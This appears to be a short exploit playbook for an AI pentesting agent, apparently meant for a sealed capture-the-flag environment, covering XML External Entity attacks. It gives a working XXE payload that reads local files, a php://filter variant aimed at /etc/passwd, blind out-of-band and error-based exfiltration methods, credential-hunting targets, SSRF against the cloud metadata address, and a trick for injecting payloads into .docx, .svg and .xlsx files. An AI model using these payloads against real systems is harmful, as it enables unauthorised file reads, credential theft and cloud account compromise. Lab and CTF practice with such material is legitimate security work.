---
name: xxe
when: the app parses XML you control (SOAP, SAML, file upload of .xml/.docx/.svg, API)
tools: [http_request, reverse_shell_listener]
phase: exploit
---
# XML External Entity

File read:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///flag">]>
<root><data>&xxe;</data></root>
```
If output is not reflected (blind), use an OOB/error channel:
- PHP wrapper to base64 a file: `SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"`.
- Blind OOB (needs egress to your listener - usually not available in the sealed cell): external DTD.
- Error-based: force the parser to include the file content in an error message via a crafted DTD.
Targets: `/flag`, `/etc/passwd`, app source/config for creds. Also try SSRF via
`SYSTEM "http://169.254.169.254/..."` (see `ssrf`). `.docx`/`.svg`/`.xlsx` are zipped XML - inject into
the inner XML and re-zip.
